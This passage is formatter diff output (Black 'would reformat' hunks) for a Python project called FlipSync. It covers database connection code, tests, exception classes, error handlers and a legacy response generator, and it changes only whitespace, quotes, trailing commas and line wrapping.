             self.logger.debug("Cleared vector storage")
         except Exception as e:
             error_msg = f"Failed to clear storage: {str(e)}"
             self.logger.error(error_msg, exc_info=True)
             raise VectorStorageError(error_msg, cause=e)
-    
+
     def _normalize_vector(self, vector: np.ndarray) -> np.ndarray:
         """
         Normalize a vector for cosine similarity.
-        
+
         Args:
             vector: Vector to normalize
-            
+
         Returns:
             Normalized vector
         """
         norm = np.linalg.norm(vector)
         if norm == 0:
             return vector
         return vector / norm
-    
+
     def _cosine_similarity(self, a: np.ndarray, b: np.ndarray) -> float:
         """
         Calculate cosine similarity between two vectors.
-        
+
         Args:
             a: First vector
             b: Second vector
-            
+
         Returns:
             Cosine similarity
         """
         return float(np.dot(a, b))
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/coordination/knowledge_repository/vector_storage.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_connection_manager.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_connection_manager.py	2025-06-19 04:03:51.513126+00:00
@@ -54,12 +54,20 @@
     mock_session_factory.return_value = mock_session
 
     mock_session.__aenter__.return_value = mock_session
     mock_session.execute.return_value = mock_result
 
-    with mock.patch('fs_agt_clean.core.db.connection_manager.create_async_engine', return_value=mock_engine), \
-         mock.patch('fs_agt_clean.core.db.connection_manager.sessionmaker', return_value=mock_session_factory):
+    with (
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.create_async_engine",
+            return_value=mock_engine,
+        ),
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.sessionmaker",
+            return_value=mock_session_factory,
+        ),
+    ):
 
         result = await connection_manager.initialize()
 
         assert result is True
         assert connection_manager._initialized is True
@@ -69,19 +77,23 @@
 
 @pytest.mark.asyncio
 async def test_initialize_failure(connection_manager, monkeypatch):
     """Test initialization failure."""
     # Mock the create_async_engine function to raise an exception
-    with mock.patch('fs_agt_clean.core.db.connection_manager.create_async_engine',
-                   side_effect=OperationalError("connection failed", None, None)):
+    with mock.patch(
+        "fs_agt_clean.core.db.connection_manager.create_async_engine",
+        side_effect=OperationalError("connection failed", None, None),
+    ):
 
         result = await connection_manager.initialize()
 
         assert result is False
         assert connection_manager._initialized is False
         assert connection_manager._health_status["status"] == "error"
-        assert connection_manager._connection_stats["errors"] == 4  # Initial attempt + 3 retries
+        assert (
+            connection_manager._connection_stats["errors"] == 4
+        )  # Initial attempt + 3 retries
 
 
 @pytest.mark.asyncio
 async def test_check_health_not_initialized(connection_manager):
     """Test health check when not initialized."""
@@ -111,12 +123,20 @@
     mock_pool.checkedin.return_value = 4
     mock_pool.checkedout.return_value = 1
     mock_pool.overflow.return_value = 0
     mock_engine.pool = mock_pool
 
-    with mock.patch('fs_agt_clean.core.db.connection_manager.create_async_engine', return_value=mock_engine), \
-         mock.patch('fs_agt_clean.core.db.connection_manager.sessionmaker', return_value=mock_session_factory):
+    with (
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.create_async_engine",
+            return_value=mock_engine,
+        ),
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.sessionmaker",
+            return_value=mock_session_factory,
+        ),
+    ):
 
         # Initialize first
         await connection_manager.initialize()
 
         # Reset the last health check time to force a new check
@@ -146,18 +166,28 @@
     mock_session.__aenter__.return_value = mock_session
 
     # First make initialization succeed
     mock_session.execute.return_value = mock_result
 
-    with mock.patch('fs_agt_clean.core.db.connection_manager.create_async_engine', return_value=mock_engine), \
-         mock.patch('fs_agt_clean.core.db.connection_manager.sessionmaker', return_value=mock_session_factory):
+    with (
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.create_async_engine",
+            return_value=mock_engine,
+        ),
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.sessionmaker",
+            return_value=mock_session_factory,
+        ),
+    ):
 
         # Initialize first
         await connection_manager.initialize()
 
         # Now make health check fail
-        mock_session.execute.side_effect = OperationalError("connection lost", None, None)
+        mock_session.execute.side_effect = OperationalError(
+            "connection lost", None, None
+        )
 
         # Reset the last health check time to force a new check
         connection_manager._last_health_check = 0
 
         # Check health
@@ -175,13 +205,21 @@
     mock_session = mock.AsyncMock()
 
     mock_session_factory = mock.MagicMock()
     mock_session_factory.return_value = mock_session
 
-    with mock.patch('fs_agt_clean.core.db.connection_manager.create_async_engine', return_value=mock_engine), \
-         mock.patch('fs_agt_clean.core.db.connection_manager.sessionmaker', return_value=mock_session_factory), \
-         mock.patch.object(connection_manager, 'initialize', return_value=True):
+    with (
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.create_async_engine",
+            return_value=mock_engine,
+        ),
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.sessionmaker",
+            return_value=mock_session_factory,
+        ),
+        mock.patch.object(connection_manager, "initialize", return_value=True),
+    ):
 
         connection_manager._initialized = True
         connection_manager._session_factory = mock_session_factory
 
         async with connection_manager.get_session() as session:
@@ -202,17 +240,25 @@
 
     mock_session_factory = mock.MagicMock()
     # First call raises error, second succeeds
     mock_session_factory.side_effect = [
         OperationalError("connection error", None, None),
-        mock_session
+        mock_session,
     ]
 
-    with mock.patch('fs_agt_clean.core.db.connection_manager.create_async_engine', return_value=mock_engine), \
-         mock.patch('fs_agt_clean.core.db.connection_manager.sessionmaker', return_value=mock_session_factory), \
-         mock.patch.object(connection_manager, 'initialize', return_value=True), \
-         mock.patch('asyncio.sleep'):  # Mock sleep to speed up test
+    with (
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.create_async_engine",
+            return_value=mock_engine,
+        ),
+        mock.patch(
+            "fs_agt_clean.core.db.connection_manager.sessionmaker",
+            return_value=mock_session_factory,
+        ),
+        mock.patch.object(connection_manager, "initialize", return_value=True),
+        mock.patch("asyncio.sleep"),
+    ):  # Mock sleep to speed up test
 
         connection_manager._initialized = True
         connection_manager._session_factory = mock_session_factory
 
         async with connection_manager.get_session() as session:
@@ -235,11 +281,11 @@
     # Mock get_session to yield our mock session
     @asynccontextmanager
     async def mock_get_session():
         yield mock_session
 
-    with mock.patch.object(connection_manager, 'get_session', mock_get_session):
+    with mock.patch.object(connection_manager, "get_session", mock_get_session):
         result = await connection_manager.execute_with_retry(mock_operation)
         assert result == "success"
 
 
 @pytest.mark.asyncio
@@ -255,12 +301,14 @@
     # Mock get_session to yield our mock session
     @asynccontextmanager
     async def mock_get_session():
         yield mock_session
 
-    with mock.patch.object(connection_manager, 'get_session', mock_get_session), \
-         mock.patch('asyncio.sleep'):  # Mock sleep to speed up test
+    with (
+        mock.patch.object(connection_manager, "get_session", mock_get_session),
+        mock.patch("asyncio.sleep"),
+    ):  # Mock sleep to speed up test
 
         with pytest.raises(OperationalError):
             await connection_manager.execute_with_retry(mock_operation)
 
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_connection_manager.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_session.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_session.py	2025-06-19 04:03:51.527573+00:00
@@ -119,10 +119,11 @@
 @pytest.mark.asyncio
 async def test_get_session_manager():
     """Test the get_session_manager function."""
     # Reset the global instance
     import sys
+
     module = sys.modules[SessionManager.__module__]
     original_session_manager = module._session_manager
     module._session_manager = None
 
     try:
@@ -153,11 +154,11 @@
     mock_session_manager.session = mock_session_cm
 
     # Patch get_session_manager
     monkeypatch.setattr(
         "fs_agt_clean.core.db.session.get_session_manager",
-        lambda: mock_session_manager
+        lambda: mock_session_manager,
     )
 
     # Use get_db_session
     session_yielded = False
     async for session in get_db_session():
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_session.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/exceptions.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/exceptions.py	2025-06-19 04:03:51.646391+00:00
@@ -21,44 +21,59 @@
         self.value = value
 
 
 class ConfigurationError(FlipSyncError):
     """Raised when configuration is invalid."""
+
     pass
 
 
 class AuthenticationError(FlipSyncError):
     """Raised when authentication fails."""
 
-    def __init__(self, message: str, marketplace: Optional[str] = None, status_code: Optional[int] = None):
+    def __init__(
+        self,
+        message: str,
+        marketplace: Optional[str] = None,
+        status_code: Optional[int] = None,
+    ):
         super().__init__(message)
         self.marketplace = marketplace
         self.status_code = status_code
 
 
 class AuthorizationError(FlipSyncError):
     """Raised when authorization fails."""
+
     pass
 
 
 class MarketplaceError(FlipSyncError):
     """Raised when marketplace operations fail."""
 
-    def __init__(self, message: str, marketplace: Optional[str] = None, status_code: Optional[int] = None):
+    def __init__(
+        self,
+        message: str,
+        marketplace: Optional[str] = None,
+        status_code: Optional[int] = None,
+    ):
         super().__init__(message)
         self.marketplace = marketplace
         self.status_code = status_code
 
 
 class DatabaseError(FlipSyncError):
     """Raised when database operations fail."""
+
     pass
 
 
 class ExternalServiceError(FlipSyncError):
     """Raised when external service calls fail."""
+
     pass
 
 
 class RateLimitError(FlipSyncError):
     """Raised when rate limits are exceeded."""
+
     pass
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/exceptions.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/errors/error_handler.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/errors/error_handler.py	2025-06-19 04:03:51.645828+00:00
@@ -19,11 +19,13 @@
 )
 
 logger = logging.getLogger(__name__)
 
 
-async def validation_exception_handler(request: Request, exc: ValidationError) -> JSONResponse:
+async def validation_exception_handler(
+    request: Request, exc: ValidationError
+) -> JSONResponse:
     """Handle Pydantic validation errors."""
     logger.warning(f"Validation error on {request.url}: {exc}")
     return JSONResponse(
         status_code=status.HTTP_422_UNPROCESSABLE_ENTITY,
         content={
@@ -175,23 +177,25 @@
 
 def setup_error_handlers(app: FastAPI) -> None:
     """Set up error handlers for the FastAPI application."""
     # Pydantic validation errors
     app.add_exception_handler(ValidationError, validation_exception_handler)
-    
+
     # FlipSync specific errors
-    app.add_exception_handler(FlipSyncValidationError, flipsync_validation_exception_handler)
+    app.add_exception_handler(
+        FlipSyncValidationError, flipsync_validation_exception_handler
+    )
     app.add_exception_handler(AuthenticationError, authentication_exception_handler)
     app.add_exception_handler(AuthorizationError, authorization_exception_handler)
     app.add_exception_handler(RateLimitError, rate_limit_exception_handler)
     app.add_exception_handler(DatabaseError, database_exception_handler)
     app.add_exception_handler(ExternalServiceError, external_service_exception_handler)
     app.add_exception_handler(ConfigurationError, configuration_exception_handler)
     app.add_exception_handler(FlipSyncError, flipsync_exception_handler)
-    
+
     # HTTP exceptions
     app.add_exception_handler(HTTPException, http_exception_handler)
-    
+
     # General exceptions (catch-all)
     app.add_exception_handler(Exception, general_exception_handler)
-    
+
     logger.info("Error handlers configured successfully")
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/errors/error_handler.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/generation/response_generator.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/generation/response_generator.py	2025-06-19 04:03:51.754640+00:00
@@ -13,70 +13,68 @@
 
 
 class ResponseGenerator:
     """
     Legacy response generator for backward compatibility.
-    
+
     This class provides basic response generation capabilities
     that are used by the chat service for legacy support.
     """
-    
+
     def __init__(self):
         """Initialize the response generator."""
         self.initialized = True
         logger.info("ResponseGenerator initialized for legacy support")
-    
+
     def generate_response(
         self,
         message: str,
         user_id: str,
         context: Optional[Dict[str, Any]] = None,
-        **kwargs
+        **kwargs,
     ) -> str:
         """
         Generate a response to a user message.
-        
+
         Args:
             message: User input message
             user_id: User identifier
             context: Optional context information
             **kwargs: Additional parameters
-            
+
         Returns:
             Generated response string
         """
         try:
             # Basic response generation for legacy compatibility
             if not message or not message.strip():
                 return "I didn't receive a message. Could you please try again?"
-            
+
             # Simple response for now - this would be enhanced with actual LLM integration
             response = f"Thank you for your message. I'm processing your request: '{message[:50]}...'"
-            
+
             logger.info(f"Generated legacy response for user {user_id}")
             return response
-            
+
         except Exception as e:
             logger.error(f"Error generating response: {e}")
             return "I apologize, but I encountered an error processing your message. Please try again."
-    
+
     def format_response(
-        self,
-        response: str,
-        metadata: Optional[Dict[str, Any]] = None
+        self, response: str, metadata: Optional[Dict[str, Any]] = None
     ) -> Dict[str, Any]:
         """
         Format a response with metadata.
-        
+
         Args:
             response: Response text
             metadata: Optional metadata
-            
+
         Returns:
             Formatted response dictionary
         """
         return {
             "response": response,
             "timestamp": datetime.now().isoformat(),
             "metadata": metadata or {},
-            "source": "legacy_response_generator"
+            "source": "legacy_response_generator",
         }
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/generation/response_generator.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_database_adapter.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_database_adapter.py	2025-06-19 04:03:51.808081+00:00
@@ -7,11 +7,14 @@
 from contextlib import asynccontextmanager
 from sqlalchemy.ext.asyncio import AsyncSession
 
 from fs_agt_clean.core.config.config_manager import ConfigManager
 from fs_agt_clean.core.db.database import Database
-from fs_agt_clean.core.db.database_adapter import DatabaseAdapter, SessionAdapter
+from fs_agt_clean.core.db.database_adapter import (
+    DatabaseAdapter,
+    SessionAdapter,
+)
 
 
 @pytest.fixture
 def config_manager():
     """Create a mock config manager."""
@@ -31,11 +34,11 @@
     """Create a database adapter with mocked dependencies."""
     # Mock the Database class
     mock_database = mock.AsyncMock(spec=Database)
     monkeypatch.setattr(
         "fs_agt_clean.core.db.database_adapter.Database",
-        lambda **kwargs: mock_database
+        lambda **kwargs: mock_database,
     )
 
     adapter = DatabaseAdapter(config_manager=config_manager)
     adapter.database = mock_database
     return adapter
@@ -68,11 +71,13 @@
 @pytest.mark.asyncio
 async def test_execute(database_adapter):
     """Test execute method."""
     database_adapter.database.execute.return_value = "result"
 
-    result = await database_adapter.execute("SELECT * FROM table", param1="value1", param2="value2")
+    result = await database_adapter.execute(
+        "SELECT * FROM table", param1="value1", param2="value2"
+    )
 
     assert result == "result"
     database_adapter.database.execute.assert_awaited_once_with(
         "SELECT * FROM table", {"param1": "value1", "param2": "value2"}
     )
@@ -94,11 +99,13 @@
 @pytest.mark.asyncio
 async def test_fetch_one(database_adapter):
     """Test fetch_one method."""
     database_adapter.database.fetch_one.return_value = {"id": 1, "name": "test"}
 
-    result = await database_adapter.fetch_one("SELECT * FROM table WHERE id = :id", id=1)
+    result = await database_adapter.fetch_one(
+        "SELECT * FROM table WHERE id = :id", id=1
+    )
 
     assert result == {"id": 1, "name": "test"}
     database_adapter.database.fetch_one.assert_awaited_once_with(
         "SELECT * FROM table WHERE id = :id", {"id": 1}
     )
@@ -107,11 +114,11 @@
 @pytest.mark.asyncio
 async def test_fetch_all(database_adapter):
     """Test fetch_all method."""
     database_adapter.database.fetch_all.return_value = [
         {"id": 1, "name": "test1"},
-        {"id": 2, "name": "test2"}
+        {"id": 2, "name": "test2"},
     ]
 
     result = await database_adapter.fetch_all("SELECT * FROM table")
 
     assert result == [{"id": 1, "name": "test1"}, {"id": 2, "name": "test2"}]
@@ -167,11 +174,13 @@
 
 
 @pytest.mark.asyncio
 async def test_create_tables_failure(database_adapter):
     """Test table creation failure."""
-    database_adapter.database.create_tables.side_effect = Exception("Table creation failed")
+    database_adapter.database.create_tables.side_effect = Exception(
+        "Table creation failed"
+    )
 
     result = await database_adapter.create_tables()
 
     assert result is False
     database_adapter.database.create_tables.assert_awaited_once()
@@ -202,11 +211,13 @@
     # Mock sqlalchemy.text
     mock_text = mock.MagicMock()
     mock_text.return_value = "text_query"
 
     with mock.patch("sqlalchemy.text", mock_text):
-        await session_adapter.execute("SELECT * FROM table", param1="value1", param2="value2")
+        await session_adapter.execute(
+            "SELECT * FROM table", param1="value1", param2="value2"
+        )
 
         mock_text.assert_called_once_with("SELECT * FROM table")
         mock_session.execute.assert_awaited_once_with(
             "text_query", {"param1": "value1", "param2": "value2"}
         )
@@ -234,13 +245,11 @@
             "SELECT * FROM table WHERE id = :id", id=1
         )
 
         assert result == {"id": 1, "name": "test"}
         mock_text.assert_called_once_with("SELECT * FROM table WHERE id = :id")
-        mock_session.execute.assert_awaited_once_with(
-            "text_query", {"id": 1}
-        )
+        mock_session.execute.assert_awaited_once_with("text_query", {"id": 1})
 
 
 @pytest.mark.asyncio
 async def test_session_adapter_fetch_one_none():
     """Test SessionAdapter fetch_one method with no result."""
@@ -260,13 +269,11 @@
             "SELECT * FROM table WHERE id = :id", id=999
         )
 
         assert result is None
         mock_text.assert_called_once_with("SELECT * FROM table WHERE id = :id")
-        mock_session.execute.assert_awaited_once_with(
-            "text_query", {"id": 999}
-        )
+        mock_session.execute.assert_awaited_once_with("text_query", {"id": 999})
 
 
 @pytest.mark.asyncio
 async def test_session_adapter_fetch_all():
     """Test SessionAdapter fetch_all method."""
@@ -289,13 +296,11 @@
         result = await session_adapter.fetch_all("SELECT * FROM table")
 
         expected = [{"id": 1, "name": "test1"}, {"id": 2, "name": "test2"}]
         assert result == expected
         mock_text.assert_called_once_with("SELECT * FROM table")
-        mock_session.execute.assert_awaited_once_with(
-            "text_query", {}
-        )
+        mock_session.execute.assert_awaited_once_with("text_query", {})
 
 
 @pytest.mark.asyncio
 async def test_session_adapter_add():
     """Test SessionAdapter add method."""
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/test_database_adapter.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/events/bus/secure_event_bus.py	2025-06-14 20:35:30.787733+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/events/bus/secure_event_bus.py	2025-06-19 04:03:51.893107+00:00
@@ -5,11 +5,14 @@
 import uuid
 from typing import Any, Callable, Dict, List, Optional, Set, Union
 
 from fs_agt_clean.core.events.base import Event, EventHandler, EventPriority, EventType
 from fs_agt_clean.core.exceptions import ValidationError
-from fs_agt_clean.core.security.message_security import MessageSecurity, MessageValidator
+from fs_agt_clean.core.security.message_security import (
+    MessageSecurity,
+    MessageValidator,
+)
 
 logger = logging.getLogger(__name__)
 
 
 class SecureEventBus:
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/events/bus/secure_event_bus.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_knowledge_graph.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_knowledge_graph.py	2025-06-19 04:03:52.010670+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for knowledge_graph
 
 This module contains agent-focused tests for the migrated knowledge_graph component.
 Tier: 2
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from knowledge_graph import *
+
 
 class TestKnowledgeGraphAgent:
     """Agent test class for knowledge_graph."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_knowledge_graph.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/db/database.py	2025-06-16 06:56:22.819283+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/db/database.py	2025-06-19 04:03:52.040078+00:00
@@ -76,15 +76,17 @@
                 self._pool_size = db_config.get("pool_size", self._pool_size)
                 self._max_overflow = db_config.get("max_overflow", self._max_overflow)
                 self._echo = db_config.get("echo", self._echo)
             else:
                 # If get() returns a non-dict, try get_section() method
-                if hasattr(self.config, 'get_section'):
+                if hasattr(self.config, "get_section"):
                     db_config = self.config.get_section("database") or {}
                     self._connection_string = db_config.get("connection_string")
                     self._pool_size = db_config.get("pool_size", self._pool_size)
-                    self._max_overflow = db_config.get("max_overflow", self._max_overflow)
+                    self._max_overflow = db_config.get(
+                        "max_overflow", self._max_overflow
+                    )
                     self._echo = db_config.get("echo", self._echo)
 
         if not self._connection_string:
             raise ValueError("Database connection string not provided")
 
@@ -96,16 +98,20 @@
             pool_timeout=self._pool_timeout,
             pool_recycle=self._pool_recycle,
             pool_pre_ping=self._pool_pre_ping,
             echo=self._echo,
             # Additional optimizations
-            connect_args={
-                "server_settings": {
-                    "application_name": "flipsync_agents",
-                    "jit": "off",  # Disable JIT for faster connection
+            connect_args=(
+                {
+                    "server_settings": {
+                        "application_name": "flipsync_agents",
+                        "jit": "off",  # Disable JIT for faster connection
+                    }
                 }
-            } if "postgresql" in self._connection_string else {},
+                if "postgresql" in self._connection_string
+                else {}
+            ),
         )
 
         self._session_factory = sessionmaker(
             self._engine, class_=AsyncSession, expire_on_commit=False
         )
@@ -124,28 +130,39 @@
         """
         self.logger.info("Starting to create database tables...")
         # Import models directly to ensure they are registered with the Base metadata
         try:
             from fs_agt_clean.core.models.database.agents import AgentModel
+
             self.logger.info("Imported AgentModel")
             from fs_agt_clean.core.models.database.auth_user import AuthUser
+
             self.logger.info("Imported auth user models")
             from fs_agt_clean.core.models.database.dashboards import DashboardModel
+
             self.logger.info("Imported DashboardModel")
         except Exception as e:
             self.logger.error(f"Error importing database models: {str(e)}")
 
         # Import new chat and agent models
         try:
             from fs_agt_clean.database.models.chat import (
-                Conversation, Message, ChatSession, MessageReaction
+                Conversation,
+                Message,
+                ChatSession,
+                MessageReaction,
             )
+
             self.logger.info("Imported chat models")
             from fs_agt_clean.database.models.agents import (
-                AgentStatus, AgentDecision, AgentPerformanceMetric,
-                AgentCommunication, AgentTask
+                AgentStatus,
+                AgentDecision,
+                AgentPerformanceMetric,
+                AgentCommunication,
+                AgentTask,
             )
+
             self.logger.info("Imported agent models")
         except Exception as e:
             self.logger.error(f"Error importing chat and agent models: {str(e)}")
 
         # Import metrics models
@@ -153,12 +170,13 @@
             from fs_agt_clean.database.models.metrics import (
                 MetricDataPoint,
                 SystemMetrics,
                 AgentMetrics,
                 AlertRecord,
-                MetricThreshold
+                MetricThreshold,
             )
+
             self.logger.info("Imported metrics models")
         except Exception as e:
             self.logger.error(f"Error importing metrics models: {str(e)}")
 
         # Get the tables we want to create
@@ -185,49 +203,57 @@
             except NameError as e:
                 self.logger.warning(f"DashboardModel not available: {e}")
 
             # Add metrics tables if they were imported successfully
             try:
-                tables.extend([
-                    MetricDataPoint.__table__,  # Create metrics tables
-                    SystemMetrics.__table__,
-                    AgentMetrics.__table__,
-                    AlertRecord.__table__,
-                    MetricThreshold.__table__,
-                ])
+                tables.extend(
+                    [
+                        MetricDataPoint.__table__,  # Create metrics tables
+                        SystemMetrics.__table__,
+                        AgentMetrics.__table__,
+                        AlertRecord.__table__,
+                        MetricThreshold.__table__,
+                    ]
+                )
                 self.logger.info("Added metrics tables to creation list")
             except NameError as e:
                 self.logger.warning(f"Metrics models not available: {e}")
 
             # Add chat and agent tables if they were imported successfully
             try:
-                tables.extend([
-                    Conversation.__table__,
-                    Message.__table__,
-                    ChatSession.__table__,
-                    MessageReaction.__table__,
-                    AgentStatus.__table__,
-                    AgentDecision.__table__,
-                    AgentPerformanceMetric.__table__,
-                    AgentCommunication.__table__,
-                    AgentTask.__table__,
-                ])
+                tables.extend(
+                    [
+                        Conversation.__table__,
+                        Message.__table__,
+                        ChatSession.__table__,
+                        MessageReaction.__table__,
+                        AgentStatus.__table__,
+                        AgentDecision.__table__,
+                        AgentPerformanceMetric.__table__,
+                        AgentCommunication.__table__,
+                        AgentTask.__table__,
+                    ]
+                )
                 self.logger.info("Added chat and agent tables to creation list")
             except NameError as e:
                 self.logger.warning(f"Chat and agent models not available: {e}")
 
             if tables:
                 async with self._engine.begin() as conn:
                     # Create tables one by one to handle conflicts
                     for table in tables:
                         try:
                             await conn.run_sync(
-                                lambda engine: Base.metadata.create_all(engine, tables=[table])
+                                lambda engine: Base.metadata.create_all(
+                                    engine, tables=[table]
+                                )
                             )
                             self.logger.info(f"Created table {table.name}")
                         except Exception as e:
-                            self.logger.warning(f"Error creating table {table.name}: {str(e)}")
+                            self.logger.warning(
+                                f"Error creating table {table.name}: {str(e)}"
+                            )
             else:
                 self.logger.warning("No tables to create")
         except Exception as e:
             self.logger.error(f"Error creating tables: {str(e)}")
 
@@ -406,11 +432,11 @@
         """
         if not self._engine:
             return {
                 "status": "unhealthy",
                 "error": "Database not initialized",
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         try:
             start_time = time.time()
 
@@ -429,63 +455,69 @@
             return {
                 "status": "healthy",
                 "response_time_ms": round(response_time * 1000, 2),
                 "pool_status": pool_status,
                 "last_check": self._last_health_check.isoformat(),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             self.logger.error(f"Database health check failed: {e}")
             return {
                 "status": "unhealthy",
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
     def _get_pool_status(self) -> Dict[str, Any]:
         """Get connection pool status."""
-        if not self._engine or not hasattr(self._engine, 'pool'):
+        if not self._engine or not hasattr(self._engine, "pool"):
             return {"status": "unknown"}
 
         pool = self._engine.pool
         return {
-            "size": getattr(pool, 'size', lambda: 0)(),
-            "checked_in": getattr(pool, 'checkedin', lambda: 0)(),
-            "checked_out": getattr(pool, 'checkedout', lambda: 0)(),
-            "overflow": getattr(pool, 'overflow', lambda: 0)(),
-            "invalid": getattr(pool, 'invalid', lambda: 0)(),
+            "size": getattr(pool, "size", lambda: 0)(),
+            "checked_in": getattr(pool, "checkedin", lambda: 0)(),
+            "checked_out": getattr(pool, "checkedout", lambda: 0)(),
+            "overflow": getattr(pool, "overflow", lambda: 0)(),
+            "invalid": getattr(pool, "invalid", lambda: 0)(),
         }
 
     async def get_connection_metrics(self) -> Dict[str, Any]:
         """Get detailed connection metrics."""
         try:
             pool_status = self._get_pool_status()
 
             # Calculate utilization
-            total_connections = pool_status.get('checked_in', 0) + pool_status.get('checked_out', 0)
+            total_connections = pool_status.get("checked_in", 0) + pool_status.get(
+                "checked_out", 0
+            )
             max_connections = self._pool_size + self._max_overflow
-            utilization = (total_connections / max_connections * 100) if max_connections > 0 else 0
+            utilization = (
+                (total_connections / max_connections * 100)
+                if max_connections > 0
+                else 0
+            )
 
             return {
                 "pool_utilization_percent": round(utilization, 2),
-                "active_connections": pool_status.get('checked_out', 0),
-                "idle_connections": pool_status.get('checked_in', 0),
+                "active_connections": pool_status.get("checked_out", 0),
+                "idle_connections": pool_status.get("checked_in", 0),
                 "total_connections": total_connections,
                 "max_connections": max_connections,
-                "overflow_connections": pool_status.get('overflow', 0),
-                "invalid_connections": pool_status.get('invalid', 0),
+                "overflow_connections": pool_status.get("overflow", 0),
+                "invalid_connections": pool_status.get("invalid", 0),
                 "pool_size": self._pool_size,
                 "max_overflow": self._max_overflow,
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
         except Exception as e:
             self.logger.error(f"Error getting connection metrics: {e}")
             return {
                 "error": str(e),
-                "timestamp": datetime.now(timezone.utc).isoformat()
+                "timestamp": datetime.now(timezone.utc).isoformat(),
             }
 
     async def close(self) -> None:
         """Close database connection.
 
@@ -503,10 +535,11 @@
         Database: Global database instance
     """
     global _database_instance
     if _database_instance is None:
         from fs_agt_clean.core.config import get_settings
+
         _database_instance = Database(get_settings())
         # Note: Database initialization must be called separately in async context
         # This function only creates the instance, initialization happens in lifespan
     return _database_instance
 
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/db/database.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_repository.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_repository.py	2025-06-19 04:03:52.123834+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for knowledge_repository
 
 This module contains agent-focused tests for the migrated knowledge_repository component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from repository import *
+
 
 class TestRepositoryAgent:
     """Agent test class for repository."""
 
     def test_import(self):
@@ -50,15 +51,16 @@
         assert True
 
     def test_primary_implementation_features(self):
         """Test features specific to PRIMARY implementation."""
         # TODO: Add tests for PRIMARY implementation features
-        # Note: 
+        # Note:
         assert True
 
     def test_vision_alignment(self):
         """Test vision alignment requirements."""
         # TODO: Add vision alignment tests for agents
         assert True
 
+
 if __name__ == "__main__":
     pytest.main([__file__])
would reformat /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_repository.py
--- /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_service.py	2025-06-14 20:35:30.791742+00:00
+++ /home/brend/Flipsync_Final/fs_agt_clean/core/knowledge/test_service.py	2025-06-19 04:03:52.149440+00:00
@@ -1,11 +1,11 @@
 """
 Agent Test module for knowledge_service
 
 This module contains agent-focused tests for the migrated knowledge_service component.
 Tier: 1
-Note: 
+Note:
 """
 
 import pytest
 import sys
 from pathlib import Path
@@ -13,10 +13,11 @@
 # Add the parent directory to the path for imports
 sys.path.insert(0, str(Path(__file__).parent.parent))
 
 # Import the module under test
 # from service import *
+
 
